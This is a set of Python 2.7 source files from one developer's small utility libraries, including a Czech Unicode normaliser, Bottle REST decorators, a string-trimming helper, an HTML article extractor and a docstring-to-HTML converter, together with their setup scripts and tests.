        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    install_requires=open("requirements.txt").read().splitlines(),

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest"
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

import {{cookiecutter.repo_name}}


# Variables ===================================================================



# Fixtures ====================================================================
# @pytest.fixture
# def fixture():
#     pass

# with pytest.raises(Exception):
#     raise Exception()


# Tests =======================================================================
def test_{{cookiecutter.repo_name}}():
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from __future__ import unicode_literals

import unicodedata


# Variables ===================================================================
TRANSLATION_TABLE = {}  #: Here you can put exceptions from normalization.

_DASH_VARIANTS = "‒–—―-‐—"
TRANSLATION_TABLE.update({udash: "-" for udash in _DASH_VARIANTS})


# Functions & classes =========================================================
def cached(fn):
    """
    Cache decorator. This decorator simply uses ``*args`` as lookup key for
    cache dict.

    If you are using python3, use functools.lru_cache() instead.
    """
    cache = {}

    def cached_decorator(*args, **kwargs):
        if args in cache:
            return cache[args]

        val = fn(*args, **kwargs)
        cache[args] = val

        return val

    return cached_decorator


@cached
def _really_normalize_char(char):
    """
    Use NFKD normalization to `char`. Return ``?`` if character couldn't be
    normalized.

    Args:
        char (unicode): Unicode character which should be normalized.

    Returns:
        unicode: Normalized character.
    """
    new_char = unicodedata.normalize('NFKD', char)
    new_char = new_char.encode('ascii', errors='replace')

    # 'Ǎ' is normalized to 'A?' and I want only 'A'
    if len(new_char) == 2:
        return new_char[0]

    return new_char


@cached
def _normalize_char(char):
    """
    Use :attr:`.TRANSLATION_TABLE` to translate `char`, or
    :func:`_really_normalize_char` if `char` wasn't found in
    attr:`.TRANSLATION_TABLE`.

    Attr:
        char (unicode): Character which should be translated/normalized.

    Returns:
        unicode: Normalized character.
    """
    return TRANSLATION_TABLE.get(char, _really_normalize_char(char))


@cached
def _is_same_char(char):
    """
    Try to convert `char` to ``latin2`` encoding and compare them.

    Args:
        char (unicode): Character to test.

    Returns:
        bool: True if `char` is convertible to ``latin2`` and back.
    """
    try:
        translated = unicode(char.encode("latin2"), "latin2")
    except UnicodeEncodeError:
        return False

    return unicode(translated) == char


def normalize(inp):
    """
    Normalize `inp`. Leave only ``latin2`` acceptible characters, normalize
    everything else, using unicode `NFKD` normalization, or
    :attr:`TRANSLATION_TABLE`.

    Convert characters which couldn't be normalized to ``?``.

    Args:
        inp (unicode): Unicode string which should be normalized.

    Returns:
        unicode: Normalized string.
    """
    try:
        inp = unicode(inp)
    except UnicodeDecodeError:
        inp = unicode(inp.decode("utf-8"))

    out = u""
    for char in inp:
        if not _is_same_char(char):
            char = _normalize_char(char)

        out += char

    return out
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))


# Actual setup definition =====================================================
setup(
    name='normalize_cz_unicode',
    version=getVersion(changelog),
    description='Take unicode string, leave czech characters, normalize rest.',
    long_description=long_description,
    url='https://github.com/Bystroushaak/normalize_cz_unicode',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
        "Development Status :: 5 - Production/Stable",
        "Natural Language :: Czech",
        "Topic :: Text Processing",
        "Topic :: Text Processing :: General",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    # install_requires=open("requirements.txt").read().splitlines(),

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest"
        ],
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from __future__ import unicode_literals

from normalize_cz_unicode import normalize


# Tests =======================================================================
def test_normalize_czech_set():
    assert normalize("ařěščýřčš") == "ařěščýřčš"


def test_normalize():
    assert normalize("😭") == "?"
    assert normalize("Ǎ") == "A"

    # unbreakable and small space
    assert normalize(" ") == " "
    assert normalize(" ") == " "


def test_strange_dashes():
    assert normalize("spojovník — a ― další") == "spojovník - a - další"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import json
from functools import wraps

from bottle import request, response, HTTPError


PRIMITIVE_TYPES = {bool, int, float, str}

if sys.version_info < (3, 0):
    PRIMITIVE_TYPES.add(long)
    PRIMITIVE_TYPES.add(unicode)


# Functions & classes =========================================================
def pretty_dump(fn):
    """
    Decorator used to output prettified JSON.

    ``response.content_type`` is set to ``application/json; charset=utf-8``.

    Args:
        fn (fn pointer): Function returning any basic python data structure.

    Returns:
        str: Data converted to prettified JSON.
    """
    @wraps(fn)
    def pretty_dump_wrapper(*args, **kwargs):
        response.content_type = "application/json; charset=utf-8"

        return json.dumps(
            fn(*args, **kwargs),

            # sort_keys=True,
            indent=4,
            separators=(',', ': ')
        )

    return pretty_dump_wrapper


def decode_json_body():
    """
    Decode ``bottle.request.body`` to JSON.

    Returns:
        obj: Structure decoded by ``json.loads()``.

    Raises:
        HTTPError: 400 in case the data was malformed.
    """
    raw_data = request.body.read()

    try:
        return json.loads(raw_data)
    except ValueError as e:
        raise HTTPError(400, e.__str__())


def encode_json_body(data):
    """
    Return prettified JSON `data`, set ``response.content_type`` to
    ``application/json; charset=utf-8``.

    Args:
        data (any): Any basic python data structure.

    Returns:
        str: Data converted to prettified JSON.
    """
    # support for StringIO / file - like objects
    if hasattr(data, "read"):
        return data

    response.content_type = "application/json; charset=utf-8"

    return json.dumps(
        data,
        indent=4,
        separators=(',', ': ')
    )


def handle_type_error(fn):
    """
    Convert ``TypeError`` to ``bottle.HTTPError`` with ``400`` code and message
    about wrong parameters.

    Raises:
        HTTPError: 400 in case too many/too little function parameters were \
                   given.
    """
    @wraps(fn)
    def handle_type_error_wrapper(*args, **kwargs):
        def any_match(string_list, obj):
            return filter(lambda x: x in obj, string_list)

        try:
            return fn(*args, **kwargs)
        except TypeError as e:
            message = e.__str__()
            str_list = [
                "takes exactly",
                "got an unexpected",
                "takes no argument",
            ]
            if fn.__name__ in message and any_match(str_list, message):
                raise HTTPError(400, message)

            raise  # This will cause 500: Internal server error

    return handle_type_error_wrapper


def json_to_params(fn=None, return_json=True):
    """
    Convert JSON in the body of the request to the parameters for the wrapped
    function.

    If the JSON is list, add it to ``*args``.

    If dict, add it to ``**kwargs`` in non-rewrite mode (no key in ``**kwargs``
    will be overwritten).

    If single value, add it to ``*args``.

    Args:
        return_json (bool, default True): Should the decorator automatically
                    convert returned value to JSON?
    """
    def json_to_params_decorator(fn):
        @handle_type_error
        @wraps(fn)
        def json_to_params_wrapper(*args, **kwargs):
            data = decode_json_body()

            if type(data) in [tuple, list]:
                args = list(args) + data
            elif type(data) == dict:
                # transport only items that are not already in kwargs
                allowed_keys = set(data.keys()) - set(kwargs.keys())
                for key in allowed_keys:
                    kwargs[key] = data[key]
            elif type(data) in PRIMITIVE_TYPES:
                args = list(args)
                args.append(data)

            if not return_json:
                return fn(*args, **kwargs)

            return encode_json_body(
                fn(*args, **kwargs)
            )

        return json_to_params_wrapper

    if fn:  # python decorator with optional parameters bukkake
        return json_to_params_decorator(fn)

    return json_to_params_decorator


def json_to_data(fn=None, return_json=True):
    """
    Decode JSON from the request and add it as ``data`` parameter for wrapped
    function.

    Args:
        return_json (bool, default True): Should the decorator automatically
                    convert returned value to JSON?
    """
    def json_to_data_decorator(fn):
        @handle_type_error
        @wraps(fn)
        def get_data_wrapper(*args, **kwargs):
            kwargs["data"] = decode_json_body()

            if not return_json:
                return fn(*args, **kwargs)

            return encode_json_body(
                fn(*args, **kwargs)
            )

        return get_data_wrapper

    if fn:  # python decorator with optional parameters bukkake
        return json_to_data_decorator(fn)

    return json_to_data_decorator


def form_to_params(fn=None, return_json=True):
    """
    Convert bottle forms request to parameters for the wrapped function.

    Args:
        return_json (bool, default True): Should the decorator automatically
                    convert returned value to JSON?
    """
    def forms_to_params_decorator(fn):
        @handle_type_error
        @wraps(fn)
        def forms_to_params_wrapper(*args, **kwargs):
            kwargs.update(
                dict(request.forms)
            )

            if not return_json:
                return fn(*args, **kwargs)

            return encode_json_body(
                fn(*args, **kwargs)
            )

        return forms_to_params_wrapper

    if fn:  # python decorator with optional parameters bukkake
        return forms_to_params_decorator(fn)

    return forms_to_params_decorator
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

import pytest

sys.path = ['src/bottle_rest'] + sys.path
import bottle_rest
from bottle_rest import HTTPError


# Functions & classes =========================================================
class MockRequest:
    def __init__(self, json):
        self.body = StringIO(json)
        self.forms = {}


def test_decode_json_body():
    bottle_rest.request = MockRequest('{"hello": "there"}')

    assert bottle_rest.decode_json_body() == {"hello": "there"}

    with pytest.raises(HTTPError):
        bottle_rest.request = MockRequest('{')
        bottle_rest.decode_json_body()


def test_encode_json_body():
    assert bottle_rest.encode_json_body({"one": 1}) == '''{
    "one": 1
}'''


def test_handle_type_error():
    @bottle_rest.handle_type_error
    def too_much_parameters(one):
        pass

    with pytest.raises(HTTPError):
        too_much_parameters("one", "two")

    @bottle_rest.handle_type_error
    def too_few_parameters(one, two, three):
        pass

    with pytest.raises(HTTPError):
        too_few_parameters("one")

    @bottle_rest.handle_type_error
    def exactly_right_ammount_of_parameters(one):
        pass

    assert exactly_right_ammount_of_parameters("one") is None


# json_to_params tests ========================================================
def test_json_to_params():
    bottle_rest.request = MockRequest('{"param": 2}')

    @bottle_rest.json_to_params
    def json_to_params_test(param):
        return param * 2

    assert json_to_params_test() == "4"  # serialized to json


def test_json_to_params_no_json_parameter():
    bottle_rest.request = MockRequest('{"param": 2}')

    @bottle_rest.json_to_params(return_json=False)
    def json_to_params_test_no_json(param):
        return param * 2

    assert json_to_params_test_no_json() == 4


def test_json_to_params_list():
    bottle_rest.request = MockRequest('[2]')  # different parameter is used

    @bottle_rest.json_to_params
    def json_to_params_test(param):
        return param * 2

    assert json_to_params_test() == "4"


def test_json_to_params_value():
    bottle_rest.request = MockRequest('2')  # different parameter is used

    @bottle_rest.json_to_params
    def json_to_params_test(param):
        return param * 2

    assert json_to_params_test() == "4"


def test_json_to_params_bad_keyword():
    bottle_rest.request = MockRequest('{"nope": 1}')

    @bottle_rest.json_to_params
    def json_to_params_test(param):
        return param * 2

    with pytest.raises(HTTPError):
        json_to_params_test()


# json_to_data tests ==========================================================
def test_json_to_data():
    bottle_rest.request = MockRequest('2')

    @bottle_rest.json_to_data
    def json_to_data_test(data):
        return data * 2

    assert json_to_data_test() == "4"


def test_json_to_data_no_json_parameter():
    bottle_rest.request = MockRequest('2')

    @bottle_rest.json_to_data(return_json=False)  # don't convert result to JSON
    def json_to_data_test(data):
        return data * 2

    assert json_to_data_test() == 4


def test_json_to_data_error_too_few():
    bottle_rest.request = MockRequest('2')

    @bottle_rest.json_to_data
    def json_to_data_test():
        pass

    with pytest.raises(HTTPError):
        json_to_data_test()


def test_json_to_data_error_too_many():
    bottle_rest.request = MockRequest('2')

    @bottle_rest.json_to_data
    def json_to_data_test(one, two):
        pass

    with pytest.raises(HTTPError):
        json_to_data_test()


# form_to_params tests ========================================================
def test_form_to_params():
    bottle_rest.request = MockRequest('""')
    bottle_rest.request.forms = {"param": 2}

    @bottle_rest.form_to_params
    def form_to_params_test(param):
        return param * 2

    assert form_to_params_test() == "4"


def test_form_to_params_no_json_parameter():
    bottle_rest.request = MockRequest('""')
    bottle_rest.request.forms = {"param": 2}

    # don't convert result to JSON
    @bottle_rest.form_to_params(return_json=False)
    def form_to_params_test(param):
        return param * 2

    assert form_to_params_test() == 4
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7, 3.4
#


def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import urllib

sys.path.append('../src/bottle_rest')

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.todo',
    'sphinx.ext.coverage',
    'sphinx.ext.viewcode',
    'sphinxcontrib.napoleon',
    'sphinx.ext.intersphinx'
]

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Sorting of items
autodoc_member_order = "bysource"

# Document all methods in classes
autoclass_content = 'both'

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = 'bottle-rest'
copyright = '2014, Bystroushaak'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import getVersion
    release = getVersion(open("../CHANGES.rst").read())
except:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = project
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages

from docs import getVersion


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions & classes =========================================================
setup(
    name='bottle-rest',
    version=getVersion(changelog),
    description="Decorators to make REST easier in Bottle.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/rbottle',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Framework :: Bottle",
        "Topic :: Internet :: WWW/HTTP :: WSGI",
        "Topic :: Internet :: WWW/HTTP :: WSGI :: Application",
        "Topic :: Software Development :: Libraries",
        "Programming Language :: Python :: 2.7",
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    include_package_data=True,
    zip_safe=True,
    install_requires=[
        'setuptools',
        "bottle",
    ],
    extras_require={
        "test": [
            "pytest"
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from functools import wraps


# Variables ===================================================================
HAIRS = "/:;,- []<>()"


# Functions & classes =========================================================
def remove_hairs(inp, hairs=HAIRS):
    """
    Remove "special" characters from beginning and the end of the `inp`. For
    example ``,a-sd,-/`` -> ``a-sd``.

    Args:
        inp (str): Input string.
        hairs (str): List of characters which should be removed. See
                     :attr:`HAIRS` for details.

    Returns:
        str: Cleaned string.
    """
    while inp and inp[-1] in hairs:
        inp = inp[:-1]

    while inp and inp[0] in hairs:
        inp = inp[1:]

    return inp


def remove_hairs_decorator(fn=None, hairs=HAIRS):
    """
    Parametrized decorator wrapping the :func:`remove_hairs` function.

    Args:
        hairs (str, default HAIRS): List of characters which should be removed.
                                    See :attr:`HAIRS` for details.
    """
    def decorator_wrapper(fn):
        @wraps(fn)
        def decorator(*args, **kwargs):
            out = fn(*args, **kwargs)

            return remove_hairs(out, hairs)

        return decorator

    if fn:
        return decorator_wrapper(fn)

    return decorator_wrapper
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import find_packages
from distutils.core import setup


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions & classes =========================================================
def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]


# Actual setup definition =====================================================
setup(
    name='remove_hairs',
    version=getVersion(changelog),
    description='Function form removing characters from both sides of string.',
    long_description=long_description,
    url='https://github.com/Bystroushaak/remove_hairs',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Software Development",
        "Topic :: Text Processing",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest"
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys

import pytest

sys.path.append('src/')
from remove_hairs import remove_hairs
from remove_hairs import remove_hairs_decorator


# Functions & classes =========================================================
def test_remove_hairs():
    assert remove_hairs(",a-sd,-/") == "a-sd"

    assert remove_hairs(" - a sd: --", " -") == "a sd:"

    assert remove_hairs(" -  --", " -") == ""

    assert remove_hairs(" -  --", "") == " -  --"

    assert remove_hairs("", "") == ""

    assert remove_hairs("", "-,.") == ""


def test_remove_hairs_decorator():
    @remove_hairs_decorator
    def x():
        return ",a-sd,-/"

    assert x() == "a-sd"

    @remove_hairs_decorator
    def x(a):
        return ",a-sd,-/"

    assert x(1) == "a-sd"

    @remove_hairs_decorator(hairs=" -")
    def y():
        return " - a sd: --"

    assert y() == "a sd:"

    @remove_hairs_decorator(hairs=" -")
    def y(a):
        return " - a sd: --"

    assert y(1) == "a sd:"
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "Bullshit filter"
__version = "1.0.1"
__date    = "26.03.2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports =====================================================================
import sys

try:
	import dhtmlparser as d
except ImportError:
	writeln("\nThis script require dhtmlparser.", sys.stderr)
	writeln("> https://github.com/Bystroushaak/pyDHTMLParser <\n", sys.stderr)
	sys.exit(1)


#= Variables ===================================================================
HTML_TEMPLATE = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<head>
	<title>{title}</title>
	
	<meta http-equiv="Content-Type" content="text/html; charset={charset}">
</head>

<body>

{content}

</body>
</HTML>"""



#= Functions & objects =========================================================
def __checkParamType(s):
	"Used in few other functions. Just check, if |s| is string or instance of HTMLElement."
	# check type of |s|
	dom = None
	if type(s) == str:
		dom = d.parseString(s)
	elif isinstance(s, d.HTMLElement):
		dom = s
	else:
		raise ValueError("Parameter s must be string or instance of HTMLElement!")

	return dom


def evaluateContainers(s, tags = ["p"], maxs = 3):
	"""
	Count which element in given string/HTMLElement |s| contains most of |tags|
	in depth = 1. Return |maxs| of those elements as 
	[(count, element0), (count, element1), ... , (count, element|maxs|)].

	|s| must be string or HTMLElement.
	"""

	def __countChilds(childs, tags):
		"Just count how much of |childs| is in |tags|."
		cnt = 0
		for child in childs:
			if child.getTagName().lower() in tags:
				cnt += 1

		return cnt
	#---

	tags = map(lambda x: x.lower(), tags)

	# check type of |s|
	dom = __checkParamType(s)

	# filter noise (headers and so on)
	body = dom.find("body")
	if len(body) > 0:
		dom = body[0]

	# filter tags with childs
	pparents = dom.find("", fn = lambda x: len(x.childs) > 0)

	parents = []
	for parent in pparents:
		parents.append((__countChilds(parent.childs, tags), parent))

	parents.sort(reverse = True)

	return parents[:maxs] if len(parents) > maxs else parents


def makeDoubleLinked(dom, parent = None):
	"Standard output from dhtmlparser is single-linked tree. This will make it double-linked."
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)

def getPredecessors(element):
	"""
	Return list of |element|s predecesors. 
	Elements must be double linked! This means, that you have to call makeDoubleLinked(dom)
	on whole DOM before you call this function!
	"""
	if element.parent != None:
		return getPredecessors(element.parent) + [element]
	else:
		return [element]

def findCommonRoot(elements):
	"Return last common predecessor of all elements or None if not found."

	if type(elements) != list:
		raise ValueError("type of |elements| have to be list!")
	if len(elements) == 0:
		raise ValueError("|elements| is blank!")
	if len(elements) == 1:
		return elements[0]

	# convert from list of elements to lists of full paths of predecesors
	element_arr = []
	for element in elements:
		element_arr.append(getPredecessors(element))

	last_common = None
	min_len = min(map(lambda x: len(x), element_arr)) # find minimal length

	# go thru predecesors and compare them
	for i in range(min_len):
		old = None
		for elements in element_arr: # iterate thru all arrays
			if old == None:
				old = elements[i]
				continue

			if old != elements[i]:
				return last_common

			old = elements[i]
		last_common = old

	return last_common


def findLargestTextBlock(s, blocknum = 2):
	"""
	Find |blocknum| of lagest continuous text blocks and return their common 
	root (element which encapsulates all of them).
	"""
	# check type of |s|
	dom = __checkParamType(s)

	makeDoubleLinked(dom)

	# filter noise (headers and so on)
	body = dom.find("body")
	if len(body) > 0:
		dom = body[0]

	# find all text blocks
	textblocks = dom.find("", fn = lambda x: not x.isTag() and not x.isComment() and len(x.childs) <= 0)

	# count how big text block are and store it as (len, block) om eval_text_blks
	eval_text_blks = []
	for block in textblocks:
		eval_text_blks.append((len(str(block)), block))

	eval_text_blks.sort(reverse = True)

	# pick |blocknum| from evaluated and sorted blocks - |blocknum| biggest blocks
	blocks = eval_text_blks[:blocknum] if len(eval_text_blks) > blocknum else eval_text_blks
	blocks = map(lambda x: x[1], blocks) # drop blocksizes

	root = findCommonRoot(blocks)

	return str(root.getContent())


def filterBullshit(s, template = True):
	"""
	Filter bullshit from webpages.

	This function is designed to strip unwanted content from articles on web. Basically, it just
	takes largest text blocks and strip everything other (ads, menu, information bars and other bullshit).
	"""
	dom = d.parseString(s)

	# parse title (only from <head>)
	title = dom.find("head")
	if len(title) > 0:
		title = title[0].find("title")
		if len(title) > 0:
			title = title[0].getContent()
		else:
			title = ""
	else:
		title = ""

	# parse charset
	charset = ""
	charset_tag = dom.find("meta", {"http-equiv":"Content-Type"})
	if len(charset_tag) >= 1:
		for meta in charset_tag:
			if meta.params["content"].startswith("text/html; charset="):
				charset = meta.params["content"].split("=")[1]
				break
		if charset == "":
			charset = "utf-8"

	# evaluate which containers contains most of <p> tags
	containers = evaluateContainers(dom)

	content = ""
	if len(containers) > 1 and containers[0][0] == containers[-1][0]: # next line :)
		# if all containers contains same amount of <p> tags, try to find largest text block
		content = findLargestTextBlock(dom)
	else:
		if len(containers) > 0:
			content = str(containers[0][1]) # take container which contains most of <p> blocks

	# apply html template
	if template:
		content = HTML_TEMPLATE                    \
		                       .replace("{title}", title)     \
		                       .replace("{charset}", charset) \
		                       .replace("{content}", content)

	return content



#= Unittests ===================================================================
if __name__ == '__main__':
	infected = """
	<HTML>
	<head>
		<title>This is just unittest.</title>

		<script>sneaky.javascript();</script>
		<meta http-equiv="Content-Type" content="text/html; charset=ascii">
	</head>

	<body>
		<div id="logo">¯\(°_o)/¯</div>
		<div id="menu">
			Menu:
				- <a href="herp.html">Herpington</a>
				- <a href="derp.html">Derpington</a>
		</div>

		<div id="content">
			<h1>Article, you want to read.</h1>
				Herp de derp, derp derp, da derpa derpa. Da derpa herp de durrrrrrr derpa daaa derrrr. 
				Derp derp, haha derp durrrr. De derp? Durpa Hurp da durpa durpa derrrr. De durpa herp de 
				derp derp durrr.<br>

				De derp? Durpa Hurp da durpa durpa derrrr. De durpa herp de derp derp durrr.Herp de derp, 
				derp derp, da derpa derpa. Da derpa herp de durrrrrrr derpa daaa derrrr. Derp derp, haha 
				derp durrrr.
		</div>

		<div id="wild_ads">Eat me, your cock will grow to the sky!</div>
		<div id="footer">© Herpington van Derp</div>
	</body>
	</HTML>
	"""
	
	cleaned = filterBullshit(infected)

	assert(infected != cleaned)
	assert(len(infected) > len(cleaned))
	assert("menu"     not in cleaned)
	assert("wild_ads" not in cleaned)
	assert("footer"   not in cleaned)#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from docutils.core import publish_parts
from sphinxcontrib.napoleon import Config, GoogleDocstring


# Functions & objects =========================================================
def sphinx_to_html(docstring):
    """
    Convert sphinx `docstring` to HTML.

    Args:
        docstring (str): Docstring in clean Sphinx.

    Returns:
        str: HTML.
    """
    document = publish_parts(docstring, writer_name='html')

    return document['body']


def napoleon_to_sphinx(docstring, **config_params):
    """
    Convert napoleon docstring to plain sphinx string.

    Args:
        docstring (str): Docstring in napoleon format.
        **config_params (dict): Whatever napoleon doc configuration you want.

    Returns:
        str: Sphinx string.
    """
    if "napoleon_use_param" not in config_params:
        config_params["napoleon_use_param"] = False

    if "napoleon_use_rtype" not in config_params:
        config_params["napoleon_use_rtype"] = False

    config = Config(**config_params)

    return str(GoogleDocstring(docstring, config))


def napoleon_to_html(docstring, **config_params):
    """
    Convert `docstring` in napoleon docstring format to HTML.

    Args:
        docstring (str): Docstring in napoleon format.
        **config_params (dict): Whatever napoleon doc configuration you want.

    Returns:
        str: HTML string.
    """
    sphinxstring = napoleon_to_sphinx(docstring, **config_params)

    return sphinx_to_html(sphinxstring)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]


# Actual setup definition =====================================================
setup(
    name='napoleon2html',
    version=getVersion(changelog),
    description='Wrappers to translate Napoleon/Sphinx docstrings to HTML.',
    long_description=long_description,
    url='https://github.com/Bystroushaak/napoleon2html',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    install_requires=open("requirements.txt").read().splitlines(),

    extras_require={
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import os.path
import ast
import inspect
import traceback


# Variables ===================================================================
# Functions & classes =========================================================
bigus_dictus = {
    "r:import": {
        "@xmlns:r": "http://resolver.nkp.cz/v3/",
        "r:monograph": {
            "r:titleInfo": {
                "r:title": "asdad",
            },
            "r:primaryOriginator": {
                "@type": "AUTHOR",
                "#text": "asd"
            },
        },
    }
}


def xex(asd=1, bsd=2, aaa=3):
    print traceback.print_stack()
    return {
        "r:import": {
            "@xmlns:r": "http://resolver.nkp.cz/v3/",
            "r:monograph": {
                "r:titleInfo": {
                    "r:title": asd,
                },
                "r:primaryOriginator": {
                    "@type": "AUTHOR",
                    "#text": bsd
                },
            },
        }
    }

# xex()
# tree = ast.parse(inspect.getsource(xex))

# for el in ast.walk(tree):
    # print el


def _disable_nested_calls(func_name, args_ast):
    for arg in args_ast:
        for el in ast.walk(arg):
            if not isinstance(el, ast.Call):
                continue

            if not hasattr(el.func, "id"):
                continue

            if el.func.id == func_name:
                raise ValueError(
                    "Sorry, nested calls are not supported!\n"
                    "All dicts are converted by default."
                )


def _match_by_lineno(func_name, known_fn, list_of_unknown):
    for candidate in list_of_unknown:
        _disable_nested_calls(func_name, candidate.args)

    candidates = filter(lambda x: x.lineno <= known_fn.lineno, list_of_unknown)

    if candidates:
        return max(candidates, key=lambda x: x.lineno)

